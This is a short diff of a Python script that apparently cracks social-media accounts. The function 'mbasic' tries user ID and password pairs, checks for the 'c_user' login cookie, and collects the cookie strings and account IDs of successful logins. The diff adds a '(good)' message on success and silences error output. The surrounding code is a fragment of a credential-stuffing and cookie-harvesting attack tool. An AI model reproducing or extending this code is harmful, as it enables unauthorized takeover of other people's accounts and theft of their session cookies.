@@ -1310,6 +1310,7 @@ def mbasic(uid,pwx,tl):
             cok = Session.cookies.get_dict()
             if "c_user" in cok:
                 cid = cok["c_user"]
+                print(f"{green}(good)")
                 coki = ";".join([f"{k}={v}" for k, v in cok.items()])
                 bkas.append(cid)
                 check = check_lock(cid)
@@ -1348,7 +1349,7 @@ def mbasic(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 #-----------------------------------boomplay----------------------------------------------------------------------------------------
 def p(uid,pwx,tl):
